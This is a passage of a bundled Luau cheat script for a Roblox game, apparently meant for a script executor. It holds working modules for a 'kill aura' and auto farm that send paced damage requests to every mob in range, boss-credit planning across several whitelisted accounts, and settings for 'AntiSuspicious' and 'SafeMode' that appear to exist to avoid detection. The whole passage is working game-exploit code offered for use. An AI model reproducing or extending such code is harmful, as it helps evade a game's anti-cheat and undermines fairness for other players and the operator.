        local radius=context.Radius(target)
        if delta:Dot(delta)>radius*radius then return nil end
        return data
    end
    function api.Update(now,targets,root,folder)
        state.AttackBurstActive=false
        if blocked()or not context then return end
        local reserving=state.ReserveGunStamina==true
        if state.SkillWantsWindow and not reserving then return "Skill aura owns damage"end
        if reserving and now<bucket.ReserveAt then return end
        local limit=reserving and 1 or math.clamp(state.FrameRequestCap or 4,1,4)
        bucket.Balance=math.min(limit,bucket.Balance+math.max(0,now-bucket.At)*(state.MaxRequestsPerSecond or 48))
        bucket.At=now
        local interval=math.max(.3,state.AttackInterval or 0)
        state.EffectiveInterval=interval;state.CurrentThreat=1;state.ThreatReason="Source per-target cooldown"
        local accepted=0
        for _,target in ipairs(targets)do
            if accepted==limit or bucket.Balance<1 then break end
            local data=admissible(target,now,root,folder)
            if data and context.Damage(target)~=false then
                api.Mark(target,now,interval*math.max(1,data.AttackBackoff or 1))
                context.Sent(target,data,now)
                accepted+=1;bucket.Balance-=1
                if reserving then bucket.ReserveAt=now+.5 end
            end
        end
        if accepted>0 then
            state.LastBurstSize=1;state.BurstsSent=(state.BurstsSent or 0)+accepted;context.Visual()
        end
        if #targets==0 then return "Active · waiting for mobs"end
        return string.format("Active · %d targets · %d requests",#targets,state.HitsSent or 0)
    end
    return api
end

-- END BUNDLED ATTACK SCHEDULER
end)()(state)
local function finishAttackBurst(reason)return normalScheduler.Cancel(reason)end
local createSkillBurst=(function()
-- BEGIN BUNDLED SKILL BURST
-- A cast owns a bounded observation ledger and one paced sender.
return function(ctx)
    local api={Started=false}
    local state,record=ctx.State,ctx.Record
    local entries,listeners={},{}
    local cancelled=false
    local rounds=math.clamp(ctx.Rounds or 3,1,ctx.RepeatWindow and 12 or 3)
    local perTarget=setmetatable({}, {__mode="k"})
    record.Desired=ctx.SourceWindow and "Active window"or rounds
    record.Targets={};record.TotalRequests=0
    local function observe(target,data)
        local entry={Target=target,TargetName=target.Name,Health=data.Health,Before=data.Health.Value,Requested=0,HealthDrops=0,Distances={}}
        entry.Distance=ctx.Distance and ctx.Distance(target,data)
        entry.RangeDistance=ctx.RangeDistance and ctx.RangeDistance(target,data)or entry.Distance
        if ctx.Contribution then entry.BeforeContribution,entry.Counter=ctx.Contribution(data.Health)end
        local last=data.Health.Value
        listeners[#listeners+1]=data.Health:GetPropertyChangedSignal("Value"):Connect(function()
            local hp=data.Health.Value
            if hp<last then
                local delta=last-hp
                entry.MinimumHealthDrop=entry.MinimumHealthDrop and math.min(entry.MinimumHealthDrop,delta)or delta
                entry.HealthDrops+=1;record.HealthDrops=(record.HealthDrops or 0)+1
            end
            last=hp
        end)
        entries[target]=entry;record.Targets[#record.Targets+1]=entry;record.Before=(record.Before or 0)+entry.Before
        return entry
    end
    local function targets(first)
        local result,visited={},{}
        for _,target in ipairs(ctx.Targets(first))do
            local data=ctx.Valid(target)
            local entry=entries[target]
            local capacity=ctx.SourceWindow or #record.Targets<(ctx.RefreshTargets and 16 or 8)
            if data and not entry and capacity then entry=observe(target,data)end
            if data and entry and not visited[target]then
                visited[target]=true;result[#result+1]=entry
                if not ctx.SourceWindow and #result==8 then break end
            end
        end
        record.TargetCount=#record.Targets
        return result
    end
    local function permitted()
        return not cancelled and not state.StopEverything and ctx.CanRun()and (not ctx.ExpiresAt or os.clock()<ctx.ExpiresAt)
    end
    local function reserve(entry,data,before,now)
        if not ctx.Budget then return end
        local estimate=ctx.EstimateDamage and ctx.EstimateDamage(entry.Target,data)or 0
        ctx.Budget.Reserve(entry,before,estimate,now,math.max(.35,(state.PingMs or 100)/1000+.15))
    end
    local function recordSend(entry,now)
        if record.LastTarget and record.LastTarget~=entry.Target then record.Retargets=(record.Retargets or 0)+1 end
        record.LastTarget=entry.Target;record.LastRequestAt=now
        entry.Requested+=1;record.TotalRequests+=1;state.SkillHitRequests=(state.SkillHitRequests or 0)+1
    end
    local function remaining(entry,data,now)
        return not ctx.Budget or ctx.Budget.Remaining(entry,data.Health.Value,now)>0
    end
    local function window(extra)
        local active,nextRefresh={},0
        local credits=math.clamp(state.FrameRequestCap or 4,1,4)
        local refill=os.clock()
        record.Status="Source skill window"
        while permitted()do
            local now=os.clock()
            if now>=nextRefresh then active=targets();nextRefresh=now+.08 end
            local cap=math.clamp(state.FrameRequestCap or 4,1,4)
            credits=math.min(cap,credits+math.max(0,now-refill)*(state.MaxRequestsPerSecond or 48));refill=now
            local sent=0
            for _,entry in ipairs(active)do
                if credits<1 or sent==cap or not permitted()then break end
                now=os.clock()
                local target=entry.Target
                if now<(perTarget[target]or 0)or (ctx.Pacing and not ctx.Pacing.Ready(target,now))then continue end
                local data=ctx.Valid(target)
                if not data then continue end
                if not remaining(entry,data,now)then record.SkippedOverkill=(record.SkippedOverkill or 0)+1;continue end
                local before=data.Health.Value
                if ctx.Send(target,data,extra)==false then continue end
                local delay=math.max(.3,ctx.Spacing or 0)
                perTarget[target]=now+delay
                if ctx.Pacing then ctx.Pacing.Mark(target,now,delay)end
                reserve(entry,data,before,now);recordSend(entry,now)
                record.Requested=record.TotalRequests;state.LastSkillBurstSize=record.TotalRequests
                sent+=1;credits-=1
            end
            task.wait(.03)
        end
        if not cancelled then record.Status="Source skill window completed"end
    end
    local function sequence(first,extra)
        for round=1,rounds do
            if round>1 then
                local waitFor=(record.LastRequestAt or os.clock())+ctx.Spacing-os.clock()
                if waitFor>0 then task.wait(waitFor)end
            end
            if ctx.ExpiresAt and os.clock()>=ctx.ExpiresAt then record.Status="Skill firing window completed";break end
            if not permitted()then record.Status="Paused for movement, dodge or network";break end
            local active=(ctx.RefreshTargets or ctx.FocusBudget)and targets(first)or record.Targets
            local sent=0
            for _,entry in ipairs(active)do
                local data=ctx.Valid(entry.Target)
                if data and ctx.FocusBudget and not remaining(entry,data,os.clock())then record.SkippedOverkill=(record.SkippedOverkill or 0)+1;data=nil end
                if not data then continue end
                if sent>0 and sent%math.clamp(state.FrameRequestCap or 4,1,4)==0 then task.wait(.015)end
                if not permitted()then break end
                if ctx.Distance then entry.Distances[#entry.Distances+1]=ctx.Distance(entry.Target,data)end
                local before=data.Health.Value
                ctx.Send(entry.Target,data,extra)
                if ctx.FocusBudget then reserve(entry,data,before,os.clock())end
                recordSend(entry,os.clock());sent+=1
                if ctx.FocusBudget then break end
            end
            if sent==0 and not ctx.RefreshTargets then record.Status="Targets defeated or out of skill range";break end
            record.Requested=round;state.LastSkillBurstSize=round
        end
        if record.Requested==rounds then record.Status=ctx.RepeatWindow and "Rifle firing sequence completed"or rounds==1 and "Skill shot sent"or "Three skill rounds sent"end
    end
    function api.Start(first,extra)
        if cancelled or api.Started or state.StopEverything or (not ctx.RefreshTargets and not ctx.Valid(first))then return false end
        targets(first)
        if #record.Targets==0 then return false end
        api.Started=true
        api.Deadline=ctx.ExpiresAt and ctx.ExpiresAt+.15 or os.clock()+3*(ctx.Spacing+.4)+.5
        record.Status="Sending area skill burst"
        task.spawn(function()
            local ok,reason=pcall(function()
                local windup=(ctx.FirstHitAt or 0)-os.clock()
                if windup>0 then task.wait(windup)end
                if ctx.SourceWindow then window(extra)else sequence(first,extra)end
            end)
            if not ok then record.Status="Skill burst error";state.LastSkillError=tostring(reason)end
            record.FinishedAt=record.FinishedAt or os.clock()
        end)
        return true
    end
    function api.Finish()
        if record.ObservationFinished then return end
        record.ObservationFinished=true
        for _,connection in ipairs(listeners)do pcall(function()connection:Disconnect()end)end
        table.clear(listeners)
        record.After=0;record.Damage=0
        for _,entry in ipairs(record.Targets)do
            local ok,reason=pcall(function()
                entry.After=entry.Health.Value;entry.HealthDamage=math.max(0,entry.Before-entry.After)
                local credited=ctx.Contribution and ctx.Contribution(entry.Health,entry.Counter)
                entry.Damage=credited~=nil and math.max(0,credited-(entry.BeforeContribution or 0))or entry.HealthDamage
                record.After+=entry.After;record.Damage+=entry.Damage
            end)
            if not ok then record.ObservationError=tostring(reason)end
        end
    end
    function api.Cancel(reason)
        cancelled=true;record.Status=reason or "Cast cancelled";record.FinishedAt=record.FinishedAt or os.clock();api.Finish()
    end
    return api
end

-- END BUNDLED SKILL BURST
end)()
local targetPriority=(function()
-- BEGIN BUNDLED TARGET PRIORITY
-- Rank metadata is merged across model/entity markers; tie ordering is deterministic.
return function()
    local api={}
    local memo=setmetatable({}, {__mode="k"})
    local function normalize(value)return tostring(value or ""):lower():gsub("[^%w]","")end
    local function root(mob)return mob:FindFirstChild("HumanoidRootPart")or mob.PrimaryPart or mob:FindFirstChild("RootPart")end
    local function marker(value)
        local key=normalize(value)
        if key:find("mainboss",1,true)or key:find("floorboss",1,true)then return 8 end
        if key:find("mini",1,true)and key:find("boss",1,true)then return 4 end
        return key:find("boss",1,true)and 2 or 0
    end
    function api.Rank(mob)
        if not mob then return 3 end
        local entity=mob:FindFirstChild("Entity")
        local difficulty=entity and entity:FindFirstChild("Difficulty")
        local modelTag=mob:GetAttribute("Rank")
        local entityTag=entity and entity:GetAttribute("Rank")
        local level=difficulty and difficulty.Value
        local old=memo[mob]
        if old and old.At>os.clock()and old.Entity==entity and old.Model==modelTag and old.EntityRank==entityTag and old.Difficulty==level then return old.Priority end
        local flags={}
        local function include(value)local code=marker(value);if code>0 then flags[code]=true end end
        include(modelTag);include(entityTag);include(level)
        for _,tag in ipairs(mob:GetTags())do include(tag)end
        if entity then for _,tag in ipairs(entity:GetTags())do include(tag)end end
        local priority=flags[8]and 1 or (flags[4]or normalize(mob.Name)=="frogazoid")and 2 or flags[2]and 1 or 3
        memo[mob]={At=os.clock()+.15,Entity=entity,Model=modelTag,EntityRank=entityTag,Difficulty=level,Priority=priority}
        return priority
    end
    function api.Less(a,b,origin,preferred)
        local ar,br=api.Rank(a),api.Rank(b)
        if ar~=br then return ar<br end
        if a==preferred or b==preferred then return a==preferred and b~=preferred end
        local ap,bp=a:FindFirstChild("HumanoidRootPart"),b:FindFirstChild("HumanoidRootPart")
        local ad=ap and (ap.Position-origin).Magnitude or math.huge
        local bd=bp and (bp.Position-origin).Magnitude or math.huge
        return ad<bd
    end
    function api.FarmLess(a,b)
        if a==b then return false end
        local ar,br=api.Rank(a),api.Rank(b)
        if ar~=br then return ar<br end
        if a.Name~=b.Name then return a.Name<b.Name end
        local ap,bp=root(a),root(b)
        if not ap or not bp then return ap~=nil and bp==nil end
        local av,bv=ap.Position,bp.Position
        if av.X~=bv.X then return av.X<bv.X end
        if av.Z~=bv.Z then return av.Z<bv.Z end
        return av.Y<bv.Y
    end
    return api
end

-- END BUNDLED TARGET PRIORITY
end)()()
local enemyRegistry=(function()
-- BEGIN BUNDLED ENEMY REGISTRY
-- Registry owns per-model records and temporary streaming observations.
return function(context)
    local api={Models={},Count=0,Revision=0}
    local entries={}
    local observedFolder,folderSignals=nil,{}
    local closed=false
    local reconcileAt=0
    local function detach(record)
        if record.Listeners then
            for _,listener in ipairs(record.Listeners)do listener:Disconnect()end
            record.Listeners=nil
        end
    end
    local function forget(model)
        local record=entries[model]
        if record then detach(record);entries[model]=nil end
    end
    local function notify(model,exists)
        api.Revision+=1
        if context.Changed then context.Changed(model,exists)end
    end
    local function register(model)
        if closed or api.Models[model]or not model:IsA("Model")then return end
        api.Models[model]=true;api.Count+=1;notify(model,true)
    end
    local function unregister(model)
        forget(model)
        if api.Models[model]then api.Models[model]=nil;api.Count-=1;notify(model,false)end
    end
    local function reset()
        for index=#folderSignals,1,-1 do folderSignals[index]:Disconnect();folderSignals[index]=nil end
        for model in pairs(entries)do forget(model)end
        table.clear(api.Models);api.Count=0
    end
    function api.Refresh()
        if closed then return nil end
        local folder=context.Folder()
        if folder~=observedFolder then
            reset();observedFolder=folder;api.Folder=folder;api.Revision+=1;reconcileAt=0
            if folder then
                folderSignals[1]=folder.ChildAdded:Connect(register)
                folderSignals[2]=folder.ChildRemoved:Connect(unregister)
            end
        end
        local at=context.Now()
        if folder and at>=reconcileAt then
            reconcileAt=at+10
            for model in pairs(api.Models)do if model.Parent~=folder then unregister(model)end end
            for _,model in ipairs(folder:GetChildren())do register(model)end
        end
        return observedFolder
    end
    local function motion(root)
        local current=root:FindFirstChild("BodyVelocity")
        if current then return current end
        return root.FindFirstChildOfClass and root:FindFirstChildOfClass("LinearVelocity")or nil
    end
    local function waitForData(model,record,at)
        record.Data=nil;record.NextRead=at+.1
        if record.Listeners or not model.DescendantAdded or not model.DescendantRemoving then return end
        local function invalidate()record.NextRead=0 end
        record.Listeners={model.DescendantAdded:Connect(invalidate),model.DescendantRemoving:Connect(invalidate)}
    end
    function api.Data(model)
        if closed or model==nil then return nil end
        if model.Parent==nil then forget(model);return nil end
        local record=entries[model]
        if record==nil then record={NextRead=0};entries[model]=record end
        local at=context.Now()
        local data=record.Data
        if data and data.Root.Parent and data.Entity.Parent==model and data.Health.Parent==data.Entity then
            data.HitLives=data.Entity:FindFirstChild("HitLives")
            if at>=(data.MetaAt or 0)then data.Motion=motion(data.Root);data.MetaAt=at+.5 end
            return data
        end
        if at<record.NextRead then return nil end
        local root=model:FindFirstChild("HumanoidRootPart")or model.PrimaryPart or model:FindFirstChild("RootPart")
        local entity=model:FindFirstChild("Entity")
        local health=entity and entity:FindFirstChild("Health")
        if not(root and root:IsA("BasePart")and health)then waitForData(model,record,at);return nil end
        detach(record)
        data={Root=root,Entity=entity,Health=health,HitLives=entity:FindFirstChild("HitLives"),Motion=motion(root),MetaAt=at+.5}
        record.Data=data;record.NextRead=0
        return data
    end
    function api.Destroy()
        if closed then return end
        closed=true;reset();observedFolder=nil;api.Folder=nil
    end
    return api
end

-- END BUNDLED ENEMY REGISTRY
end)()({Now=os.clock,Folder=function()return workspace:FindFirstChild("Mobs")end,
    Changed=function()
        state.MultiSpotNextScan=0
        local scheduler=state.WorkScheduler
        if scheduler then for _,name in ipairs({"Movement","Combat","Skill"})do scheduler.Wake(name)end end
        if state.WakeSkillAura then state.WakeSkillAura()end
    end})
state.EnemyRegistry=enemyRegistry
local trackedMobs=enemyRegistry.Models
local indexedMobFolder
local function refreshMobIndex()
    local folder=enemyRegistry.Refresh();indexedMobFolder=folder;return folder
end
local function getMobData(mob)
    if not mob then return nil end
    local data=enemyRegistry.Data(mob)
    if data and state.ObserveBetweenReward then state.ObserveBetweenReward(mob,data.Health)end
    return data
end
function state.ReadOwnDamage(health,counter)
    if health==nil then return nil,nil end
    local tag=counter or health:FindFirstChild(player.Name)
    if tag and tag:IsA("ValueBase")and type(tag.Value)=="number"then return tag.Value,tag end
    return nil,nil
end
do
    local createCredit=(function()
-- BEGIN BUNDLED CREDIT CHECK
-- Group admission, per-enemy acknowledgment leases, and action planning share one gate.
return function(ctx)
    local state=ctx.State
    local api={}
    local flights=setmetatable({}, {__mode="k"})
    local group={}
    local function status(text)state.CreditCheckStatus=text end
    local function contribution(data,person)
        local value=ctx.Damage(data,person)
        if type(value)~="number"or value~=value or math.abs(value)==math.huge then return nil end
        return value
    end
    local function roster()
        local members=ctx.Members()
        if group.Members==members then return group.Ready,members,group.Missing end
        local missing,ids={},{}
        for _,person in ipairs(members)do
            local absent=type(person)=="table"and person.CreditMissing==true
            ids[#ids+1]=tostring(person.UserId or person.Name)..":"..tostring(absent)
            if absent then missing[#missing+1]=person.Name end
        end
        table.sort(ids)
        local signature=table.concat(ids,"|")
        if signature~=group.Signature then table.clear(flights)end
        group={Members=members,Missing=missing,Ready=#members>1 and #missing==0,Signature=signature}
        return group.Ready,members,missing
    end
    function api.Reset()table.clear(flights);group={};state.CreditDamagePlan=nil end
    function api.Observe(target,data)
        local pending=flights[target]
        local value=contribution(data,ctx.Self())
        if not pending or not value or value<=pending.Before then return end
        if ctx.Planner and pending.Key then ctx.Planner.Learn(pending.Key,value-pending.Before)end
        flights[target]=nil
    end
    function api.FarmTarget(locked,candidates,valid,less)
        if not state.CreditCheck or not roster()then return locked end
        local best
        for candidate in pairs(candidates)do
            if ctx.Rank(candidate)<=2 and valid(candidate)and (not best or less(candidate,best))then best=candidate end
        end
        return best or locked
    end
    local function maximum(data)
        local value=ctx.MaxHealth(data)
        if type(value)=="number"and value==value and value>0 and value<math.huge then return value end
    end
    local function progress(data,members,required)
        local result={Waiting=0,Unknown={},Partial={}}
        for _,person in ipairs(members)do
            local value=contribution(data,person)
            if value==nil then result.Unknown[#result.Unknown+1]=person.Name end
            if (type(person)=="table"and person.CreditMissing)or (value or 0)<required then
                result.Waiting+=1
                if value~=nil and not(type(person)=="table"and person.CreditMissing)then
                    result.Partial[#result.Partial+1]=person.Name.." "..math.floor(value).."/"..math.ceil(required)
                end
            end
        end
        return result
    end
    function api.Allow(target,data)
        api.Bypass=false
        if not state.CreditCheck or ctx.Rank(target)>2 then return true end
        local ready,members,missing=roster()
        if not ready then
            api.Bypass=true;flights[target]=nil
            status(#missing>0 and "Credit Check inactive · missing from server: "..table.concat(missing,", ")or "Credit Check inactive · no other accounts in whitelist")
            return true
        end
        local max=maximum(data)
        if not max then status("Credit Check · waiting for maximum HP");return false end
        local required=max*.05
        api.Observe(target,data)
        local own=contribution(data,ctx.Self())or 0
        local observed=progress(data,members,required)
        if observed.Waiting==0 then flights[target]=nil;status("Credit Check · everyone qualified · finishing");return true end
        if #members>20 then status("Credit Check · more than 20 accounts cannot each receive 5% of one HP pool");return false end
        local detail=#observed.Unknown>0 and "no replicated damage counter on "..tostring(target.Name or "this enemy")..": "..table.concat(observed.Unknown,", ")
            or "below required: "..table.concat(observed.Partial,", ")
        if own>=required then
            flights[target]=nil
            status("Credit Check · you qualified · group "..(#members-observed.Waiting).."/"..#members.." ready · "..detail)
            return false
        end
        local pending=flights[target]
        if pending then
            if own==pending.Before and ctx.Now()<pending.Deadline then status("Credit Check · waiting for damage acknowledgment");return false end
            flights[target]=nil
        end
        status("Credit Check · "..math.floor(own).." / "..math.ceil(required).." · "..detail)
        return true
    end
    function api.AllowAction(target,data,kind)
        api.ActionReason=nil
        if not api.Allow(target,data)then
            local max=maximum(data)
            api.ActionReason=max and (contribution(data,ctx.Self())or 0)>=max*.05 and "Qualified"or "Waiting"
            return false
        end
        if api.Bypass or not state.CreditCheck or ctx.Rank(target)>2 or not ctx.Planner or not ctx.Options then return true end
        local own=contribution(data,ctx.Self())
        if own==nil and kind=="Normal"then return true end
        local remaining=ctx.MaxHealth(data)*.05-(own or 0)
        if remaining<=0 then return true end
        local options=ctx.Options(target,data,kind)
        local normal=ctx.Planner.Estimate(options.NormalKey)
        local skill=ctx.Planner.Estimate(options.CastKey or options.SkillKey)
        normal=normal>0 and normal or options.NormalEstimate or 0
        skill=skill>0 and skill or options.SkillEstimate or 0
        if kind=="Skill"and options.ActiveSkill then
            api.ActionReason=options.CanNormal and normal>0 and remaining<=normal and "Normal"or "Skill"
            return api.ActionReason=="Skill"
        end
        local chosen,plan=ctx.Planner.Choose(remaining,normal,skill,options.CanNormal,options.CanSkill)
        state.CreditDamagePlan=plan;api.ActionReason=chosen
        if chosen then
            status(plan.Calibrating and "Credit Check · learning "..chosen.." damage"or "Credit Check · remaining "..math.ceil(remaining).." · plan "..plan.Skill.." skill hit(s) + "..plan.Normal.." normal hit(s)")
        end
        return chosen==(kind=="SkillStart"and "Skill"or kind)
    end
    function api.Sent(target,data,kind)
        if not state.CreditCheck or ctx.Rank(target)>2 then return end
        if not roster()then flights[target]=nil;return end
        local max=maximum(data);local own=contribution(data,ctx.Self())or 0
        if not max or own>=max*.05 then return end
        local options=ctx.Options and ctx.Options(target,data,kind or "Normal")
        local key=options and (kind=="Skill"and options.SkillKey or options.NormalKey)
        flights[target]={Key=key,Before=own,Deadline=ctx.Now()+math.clamp((state.PingMs or 100)/1000+.25,.4,1.5)}
    end
    return api
end

-- END BUNDLED CREDIT CHECK
    end)()
    local createRoster=(function()
-- BEGIN BUNDLED CREDIT ROSTER
-- Resolve aliases once; unmatched configured identities remain explicit requirements.
return function(self,players,text)
    local lookup={}
    for _,person in ipairs(players)do
        lookup[person.Name:lower()]=person
        lookup[tostring(person.UserId)]=person
    end
    local members={self}
    local identities={[tostring(self.UserId)]=true}
    for token in tostring(text or ""):gmatch("[%w_]+")do
        local person=lookup[token:lower()]or lookup[token]
        local identity=person and tostring(person.UserId)or "missing:"..token:lower()
        if not identities[identity]then
            identities[identity]=true
            members[#members+1]=person or {Name=token,UserId=tonumber(token),CreditMissing=true}
        end
    end
    return members
end

-- END BUNDLED CREDIT ROSTER
    end)()
    local createPlanner=(function()
-- BEGIN BUNDLED CREDIT DAMAGE PLAN
-- Bounded conservative estimates plus a lexicographic minimum-overkill search.
return function()
    local api={}
    local estimates,ring={},{}
    local cursor=1
    local function valid(value)return type(value)=="number"and value==value and value>0 and value<math.huge end
    function api.Learn(key,amount)
        if type(key)~="string"or not valid(amount)then return end
        if estimates[key]then estimates[key]=math.min(estimates[key],amount);return end
        local expired=ring[cursor]
        if expired then estimates[expired]=nil end
        ring[cursor]=key;cursor=cursor%128+1;estimates[key]=amount
    end
    function api.Estimate(key)return estimates[key]or 0 end
    function api.Choose(remaining,normal,skill,canNormal,canSkill)
        if remaining<=0 then return nil end
        normal=normal or 0;skill=skill or 0
        if canNormal and normal<=0 then return "Normal",{Calibrating=true}end
        if canSkill and skill<=0 then return "Skill",{Calibrating=true}end
        local result
        local function offer(normals,skills)
            local total=normals*normal+skills*skill
            if total<remaining then return end
            local excess,actions=total-remaining,normals+skills
            if result and (result.Excess<excess or (result.Excess==excess and (result.Actions<actions or (result.Actions==actions and result.Skill<=skills))))then return end
            result={Normal=normals,Skill=skills,Damage=total,Excess=excess,Actions=actions}
        end
        if canNormal and normal>0 then offer(math.ceil(remaining/normal),0)end
        if canSkill and skill>0 then
            local allSkill=math.ceil(remaining/skill)
            offer(0,allSkill)
            if canNormal and normal>0 then
                for skills=1,math.min(64,allSkill)do offer(math.max(0,math.ceil((remaining-skills*skill)/normal)),skills)end
            end
        end
        if result then return result.Skill>0 and "Skill"or "Normal",result end
    end
    return api
end

-- END BUNDLED CREDIT DAMAGE PLAN
    end)()
    local group={Text=false,At=0,Members=nil}
    local function roster()
        local text=state.CreditWhitelistText or "";local at=os.clock()
        if group.Members==nil or group.Text~=text or at>=group.At then
            group.Text=text;group.At=at+.25;group.Members=createRoster(player,Players:GetPlayers(),text)
        end
        return group.Members
    end
    local function maxHealth(data)
        local health=data.Health
        for _,class in ipairs({"DoubleConstrainedValue","IntConstrainedValue"})do if health:IsA(class)then return health.MaxValue end end
        local number=health:GetAttribute("MaxValue")or data.Entity:GetAttribute("MaxHealth")
        if type(number)=="number"then return number end
        local value=data.Entity:FindFirstChild("MaxHealth")
        return value and value:IsA("ValueBase")and tonumber(value.Value)or nil
    end
    local function contribution(data,person)
        if type(person)=="table"and person.CreditMissing then return nil end
        local health=data.Health
        local tag=health:FindFirstChild(person.Name)or health:FindFirstChild(tostring(person.UserId))
        if not(tag and tag:IsA("ValueBase"))then return nil end
        local value=tag.Value
        return type(value)=="number"and value==value and math.max(0,value)or nil
    end
    local function options(mob,data,kind)
        local equipped=state.WeaponSkills
        local version=equipped and equipped.Version or 0
        local skill=state.SelectedSkill
        local stem=tostring(version)..":"..mob.Name
        local available=state.SkillAura and equipped and equipped.Ready and equipped.IsCompatible(skill)
        if available and kind~="Skill"then
            local definition=ReplicatedStorage.Database.Skills:FindFirstChild(skill)
            available=Skills.usingSkill=="none"and Skills.GetCooldown(skill)>=0 and definition
                and Skills.HasStamina(definition.Cost.Value)and state.SkillActivation and state.SkillActivation.CanHandle(skill)
        end
        local estimateKey=skill..":"..version..":"..mob.Name
        return {NormalKey="Normal:"..stem,SkillKey="Skill:"..skill..":"..stem,CastKey="Cast:"..skill..":"..stem,
            ActiveSkill=kind=="Skill"and state.SkillCastRunning,NormalEstimate=data.NormalDamagePerHit,
            SkillEstimate=state.SkillDamageBudget and state.SkillDamageBudget.Estimate(estimateKey)or 0,
            CanNormal=state.Enabled==true,CanSkill=available==true}
    end
    state.CreditDamagePlanner=createPlanner()
    state.CreditController=createCredit({State=state,Planner=state.CreditDamagePlanner,Options=options,
        Rank=targetPriority.Rank,Now=os.clock,Self=function()return player end,Members=roster,MaxHealth=maxHealth,Damage=contribution})
    function state.SetCreditCheck(enabled)
        state.CreditCheck=enabled==true;state.CreditController.Reset()
        state.CreditCheckStatus=state.CreditCheck and "Credit Check · waiting for a boss or mini-boss"or "Credit Check is off"
        if state.WakeSkillAura then state.WakeSkillAura()end
        requestSave()
    end
    function state.SetCreditWhitelist(text)
        local names={};local included={}
        for token in tostring(text or ""):gmatch("[%w_]+")do
            local key=token:lower()
            if not included[key]then included[key]=true;names[#names+1]=token end
        end
        local serialized=table.concat(names,", ")
        assert(#names<=100 and #serialized<=2000,"Use at most 100 Credit Check whitelist entries")
        state.CreditWhitelistText=serialized;group.Text=false;group.Members=nil
        state.CreditController.Reset();requestSave()
    end
end
local function getMobRoot(mob)
    local data=getMobData(mob);return data and data.Root
end
-- Controllers publish values through plain adapters; only WindUI renders them.
local controllerViews=(function()
-- BEGIN BUNDLED CONTROLLER VIEW
-- Nonvisual controller projections deliberately have no hierarchy or callbacks.
return function()
    local factory={}
    local connection={Connected=false,Disconnect=function()end}
    local nullSignal={ControllerSignal=true}
    function nullSignal:Connect()return connection end
    local behavior={}
    behavior.GetChildren=function()return {}end
    behavior.FindFirstChild=function()return nil end
    behavior.IsA=function()return false end
    behavior.IsFocused=function()return false end
    behavior.GetPropertyChangedSignal=function()return nullSignal end
    behavior.Destroy=function(self)self.Parent=nil end
    behavior.Clone=function(self)return factory.New(table.clone(self))end
    local eventNames={"Activated","FocusLost","InputBegan","InputChanged","InputEnded","Changed","Destroying"}
    for _,event in ipairs(eventNames)do behavior[event]=nullSignal end
    local metatable={__index=behavior}
    function factory.New(values,parent)
        local projection={ControllerView=true,Text="",Visible=false,Parent=parent}
        for property,value in pairs(values or {})do projection[property]=value end
        return setmetatable(projection,metatable)
    end
    return factory
end

-- END BUNDLED CONTROLLER VIEW
end)()()
state.StartupSliceAt=os.clock()
function state.YieldStartup()
    if state.StartupComplete then return end
    local now=os.clock()
    if now-state.StartupSliceAt>=.002 then task.wait();state.StartupSliceAt=os.clock()end
end
local function create(class,properties,parent)
    if type(parent)=="table"and parent.ControllerView then return controllerViews.New(properties,parent)end
    state.YieldStartup()
    local instance=Instance.new(class)
    for property,value in pairs(properties)do instance[property]=value end
    instance.Parent=parent
    return instance
end
local function bind(signal,callback)
    if type(signal)=="table"and signal.ControllerSignal then return signal:Connect()end
    local connection=signal:Connect(callback);connections[#connections+1]=connection;return connection
end
local function corner(object,radius)create("UICorner",{CornerRadius=UDim.new(0,radius or 10)},object)end
local content=controllerViews.New({Name="ControllerState"})
local function uiButton(name,text,order,height,parent)return controllerViews.New({Name=name,Text=text},parent or content)end
local function uiLabel(name,text)return controllerViews.New({Name=name,Text=text},content)end
local function revealOptions()end
local toggle=uiButton("Toggle","Kill aura · OFF")
local farmToggle=uiButton("AutoFarm","Auto farm · OFF")
local dodgeToggle=uiButton("AutoDodge","Auto dodge · ON")
local gui=runtimeOwner.Root
local showUI=create("TextButton",{Name="ShowUI",Text="🪶",Visible=false,Font=Enum.Font.GothamBold,
    TextSize=26,Size=UDim2.fromOffset(44,44),Position=UDim2.new(.5,0,0,48),AnchorPoint=Vector2.new(.5,0),
    BackgroundColor3=Color3.fromRGB(42,42,44),BorderSizePixel=0,TextColor3=Color3.fromRGB(239,239,241)},gui)
corner(showUI,22)
create("UIStroke",{Color=Color3.new(1,1,1),Transparency=.8,Thickness=1},showUI)
function state.SetUIVisible(requested)
    state.UIHidden=true;showUI.Visible=state.Running==true
    if requested and state.Running and state.WindUIError and state.RestartScript then state.RestartScript()end
end
bind(showUI.Activated,function()state.SetUIVisible(state.UIHidden)end)
local persistedFields={"NoSelfDamage","AeganatosDodge","AtheonUnlock","AutoCreateBetween","BetweenRooms","BetweenPace","BetweenAccess","BetweenDifficulty","AutoCraft","AutoTrade","TradeMode","TradeItems","AutoDismantle","AutoEquipBestSword",
    "AutoJoinFriend","JoinFriendUsername","SafeMode","SafeWhitelistText","SafeWhitelistIds","AntiSuspicious","AntiSuspiciousLimits","MultiSpot","MultiSpotSelected",
    "MultiSpotOrder","MultiSpotCursor","MultiSpotPending","AccountProgression","ProgressionFloor","ProgressionBossCleared",
    "ProgressionComplete","ProgressionBossClearedName","ProgressionRestore","AutomationRunId","AutomationResumeFeatures",
    "Enabled","AutoFarm","BossOnly","CreditCheck","CreditWhitelistText","AutoSwing","Radius","SkillRange","OffsetProfiles",
    "UnsafeOffsetProfiles","Threat","SkillAura","SelectedSkill","SkillPerWeapon","SkillPerWeaponVersion","SelectedMiscSkill",
    "AutoExplore","AutoDodge","AtheonDodge","PerformanceBoosters","WindUIPosition","AutoHideUI","Theme","SelectedPlayerId"}
local function settingsPayload()
    local payload={Version=1,StopEverything=false,PanelPosition={0,0,0,0}}
    for _,field in ipairs(persistedFields)do payload[field]=state[field]end
    payload.SafeFloorId=state.SharedSafeFloorId or state.SafeFloorId
    payload.ActiveTab=state.UI and state.UI.ActiveTab
    payload.MiscSkillEnabled=state.MiscSkillEnabled==true
    payload.ViewingPlayer=state.ViewingPlayer==true;payload.ViewingPlayerInventory=state.ViewingPlayerInventory==true
    local position=enemyHUD and enemyHUD.Position
    payload.HealthHUDPosition=position and {position.X.Scale,position.X.Offset,position.Y.Scale,position.Y.Offset}or {.5,0,.7,0}
    return payload
end
local lastSavedPayload,lastSavedStorageGeneration
local savePending,lastSettingsEdit=false,0
function state.SaveNow()
    if not filePersistence or state.AutoSaveSuspended then return false end
    local payload=settingsPayload()
    local ok,reason=pcall(function()
        local storage=state.StorageBootstrap
        if storage then local ready,message=storage.Ensure();assert(ready,message)end
        if type(isfolder)=="function"and type(makefolder)=="function"and not isfolder(configFolder)then makefolder(configFolder)end
